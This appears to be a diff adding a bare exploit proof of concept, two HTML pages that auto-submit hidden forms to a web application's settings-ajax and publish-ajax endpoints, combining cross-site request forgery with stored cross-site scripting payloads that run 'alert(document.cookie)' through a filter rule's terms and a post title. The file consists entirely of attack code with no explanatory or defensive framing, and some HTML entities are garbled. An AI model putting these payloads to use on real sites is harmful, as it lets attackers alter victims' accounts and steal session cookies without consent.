@@ -1,0 +1,15 @@
+1.
+&lt;form action=&quot;www.example.com/settings-ajax/stream_filter_rules/create&quot; method=&quot;post&quot; name=&quot;main&quot;&gt;
+&lt;input type=&quot;hidden&quot; name=&quot;stream_filter_rule&quot; value=&#039;{&quot;name&quot;:&quot;rulename&quot;,&quot;id&quot;:&quot;&quot;,&quot;flags&quot;:[ &quot;flagged&quot;],&quot;networks&quot;:null,&quot;user_id&quot;:&quot;0&quot;,&quot;terms&quot;:&quot;XSS\&amp; quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;&quot;}&#039;&gt;
+&lt;/form&gt;
+&lt;script&gt;
+document.main.submit();
+&lt;/script&gt;
+
+2.
+&lt;form action=&quot;www.example.com/publish-ajax/efforts/create&quot; method=&quot;post&quot; name=&quot;main&quot;&gt;
+&lt;input type=&quot;hidden&quot; name=&quot;effort&quot; value=&#039;{&quot;effort_id&quot;:&quot;&quot;,&quot;title&quot;:&quot;ptitle2\&quot;&gt;&lt; font color=&quot;#0000FF&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;&quot;,&quot;url&quot;:&quot;http://www.google.com&quot;,&quot;short&amp;q uot;:null,&quot;campaigns&quot;:[],&quot;primary_campaign&quot;:null,&quot;flights&quot;:[{&quot;glass_id&quot; ;:&quot;post0&quot;,&quot;flight_id&quot;:null,&quot;mdk&quot;:false,&quot;source&quot;:&quot;web interface&quot;,&quot;content_type&quot;:&quot;twitter-status&quot;,&quot;content&quot;:{&quot;content&quot;:&amp; quot;hello&quot;},&quot;stime&quot;:&quot;4/30/2011 23:10:00&quot;,&quot;networks&quot;:[{&quot;id&quot;:&quot;1&quot;,&quot;name&quot;:&quot;My Name&quot;,&quot;type&quot;:&quot;twitter&quot;,&quot;url&quot;:&quot;&quot;,&quot;avatar&quot;:&quot;http://a 2.twimg.com/profile_images/1124040897/at-twitter_reasonably_small.png&quot;}],&quot;waparams&quot;:{&quot;pnam e&quot;:null}}]}&#039;&gt;
+&lt;/form&gt;
+&lt;script&gt;
+document.main.submit();
+&lt;/script&gt;
